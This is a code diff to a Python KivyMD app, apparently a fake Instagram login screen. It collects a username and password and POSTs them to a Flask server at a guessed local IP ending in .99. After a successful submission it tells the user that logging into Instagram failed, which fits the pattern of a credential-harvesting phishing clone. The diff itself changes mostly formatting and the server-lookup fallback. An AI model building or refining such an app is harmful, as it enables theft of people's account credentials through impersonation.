@@ -9,25 +9,25 @@ from requests.exceptions import ConnectionError
 
 ############################# MESSAGES ##################################
 
-message_login_successful='The was a problem logging you into Instagram. Please try again soon.'
-message_login_failed='Incorrect username or password. Please try again.'
-message_server_connection="We couldn't connect to Instagram. Make sure you're connected to the internet and try again."
-message_connection_error='Server is down or unreachable. Please try again soon.'
-message_empty_login="Username or password cannot be empty. Please try again."
+message_login_successful = 'The was a problem logging you into Instagram. Please try again soon.'
+message_login_failed = 'Incorrect username or password. Please try again.'
+message_server_connection = "We couldn't connect to Instagram. Make sure you're connected to the internet and try again."
+message_connection_error = 'Server is down or unreachable. Please try again soon.'
+message_empty_login = "Username or password cannot be empty. Please try again."
 
 #########################################################################
 
-# Window.size = (400, 680)
+Window.size = (400, 680)
+
 
 class InstagramApp(MDApp):
     def build(self):
         return Builder.load_file('insta-login.kv')
 
-
     def on_login(self, username, password):
-        if self.is_server_available(): # Check server connection
+        if self.is_server_available():  # Check server connection
             url = self.get_server_ip()
-            api_url = url+"/user" # This api is connect to your server (flask,fastapi or something).
+            api_url = url + "/user"  # This api is connect to your server (flask,fastapi or something).
             payload = {'username': username, 'password': password}
             try:
                 response = requests.post(api_url, json=payload)
@@ -54,24 +54,27 @@ class InstagramApp(MDApp):
         except socket.error as e:
             pass
 
-
     def get_server_ip(self):
         public_ip = self.get_public_ip()
         if public_ip:
             # Change public ip last octet for find server ip
-            ip = public_ip.rsplit('.', 1)[0] + '.99' # Set server ip to static ip ,change last octect to .99 
-            url = "http://"+ip+":5000/" # This is flask server ip, for example: http://192.168.100.99:5000
+            flask_server_ip_last_octet = '.99'
+            ip = public_ip.rsplit('.', 1)[0] + flask_server_ip_last_octet
+            url = "http://" + ip + ":5000/"  # This is flask server ip, for example: http://192.168.100.99:5000
         else:
-            url = "http://192.168.1.1:5000/"
+            url = False
 
         return url
 
     # Check server connection
     def is_server_available(self):
-        url=self.get_server_ip()
+        url = self.get_server_ip()
         try:
-            requests.get(url)
-            return True
+            if url is False:
+                return False
+            else:
+                requests.get(url)
+                return True
         except ConnectionError:
             return False
 
